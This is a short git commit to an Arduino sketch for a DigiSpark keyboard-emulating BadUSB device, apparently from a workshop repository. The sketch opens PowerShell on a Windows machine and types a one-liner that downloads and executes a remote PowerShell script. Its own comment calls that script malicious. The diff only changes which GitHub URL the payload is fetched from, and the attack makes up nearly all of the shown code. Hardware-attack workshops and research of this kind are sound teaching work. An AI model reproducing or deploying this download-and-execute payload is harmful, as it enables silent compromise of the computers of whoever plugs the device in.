753629e2d5f62c5eec3ba9854b35cfcc7ad62906
matheus vrech <whoismath@gmail.com>
2018-01-06 00:10:01 -0300

    Update windows2.ino
    change payload

--- windows/windows2.ino
+++ windows/windows2.ino
@@ -10,7 +10,7 @@ void loop() {
   delay(50); /* Delay until it opens. */
   DigiKeyboard.println(F("powershell")); /* Open powershell. */
   delay(400); /* You may have to adjust this delay. */
-  DigiKeyboard.print(F("Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/whoismath/a965e49313498b3ab4ef5a020ab573e7/raw/ed8dbca8c0a9fcd976e5f51f03957add427f68f0/change.ps1')"));  /* Download and execute malicius script. */
+  DigiKeyboard.print(F("Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/whoismath/BadUSB_Workshop/master/Payloads/payload-windows.ps1')"));  /* Download and execute malicius script. */
   DigiKeyboard.sendKeyStroke(KEY_ENTER, 0); /* Send the command. */
   for(;;) { /* run just once. */ }
 }
